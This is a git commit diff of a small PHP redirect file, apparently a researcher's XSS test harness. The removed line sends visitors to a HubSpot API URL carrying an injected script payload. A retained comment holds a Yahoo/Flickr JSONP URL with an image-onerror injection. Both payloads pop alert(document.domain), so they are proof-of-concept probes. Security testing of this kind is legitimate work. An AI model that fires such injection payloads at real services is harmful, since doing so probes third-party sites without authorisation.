d8b5bc8cda835dc52a9d23a07c91b9c1967eeb08
missoum1307 <missoum1307@users.noreply.github.com>
2018-12-16 03:26:47 +0100

    Update yahoo1.php

--- yahoo1.php
+++ yahoo1.php
@@ -1,12 +1,12 @@
 <?php 
 
-header("Location: https://api.hubapi.com/presentations/v1/revisit/12655263/2943245/download?portalId=<?PXML><html:script>alert(document.domain)</html:script>
-")
+header("Location: tourbuilder.withgoogle.com/tours/ahJzfmd3ZWItdG91cmJ1aWxkZXJyEQsSBFRvdXIYgICg7tb6oAsM/csv");
 
 
 
 /* https://y-flickr.yahoo.com/ad?rmx=1&count=8&r=1&ri=1190645158&callback=YUI.Env.JSONP.yui_3_16_0_1_1467072000031_1013
 
 https://y-flickr.yahoo.com/ad?rmx=1111&count=8888&r=144444&ri=1190645158&callback=YUI.Env.JSONP.aaa%3Cimg%20src=%20onerror=alert(document.domain)%3E
-*/?>
+*/
+?>
   
